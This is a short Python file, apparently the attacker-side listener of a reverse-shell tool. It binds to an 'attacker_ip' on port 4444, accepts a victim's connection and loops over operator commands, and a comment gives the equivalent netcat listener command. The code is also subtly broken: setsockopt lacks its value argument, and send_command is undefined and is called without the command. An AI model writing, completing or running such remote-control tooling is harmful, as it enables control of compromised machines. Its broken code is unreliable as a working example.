import socket 
from socket import AF_INET, SOCK_STREAM, SOL_SOCKET, SO_REUSEADDR

# netcat alternative :  nc -vv -l -p 4444


class Listener:
    def __init__(self, attacker_ip, port=4444):
        listener = socket.socket(AF_INET, SOCK_STREAM)
        listener.setsockopt(SOL_SOCKET, SO_REUSEADDR)
        listener.bind((attacker_ip, port))
        listener.listen(0)
        print('[+] Waiting for imcomming connections ...')

        self.connection, address = listener.accept()
        print(f'[+] New connection from {address}')


    def run(self):
        while True:
            command = input('>> ')
            result = self.send_command()
            print(result)

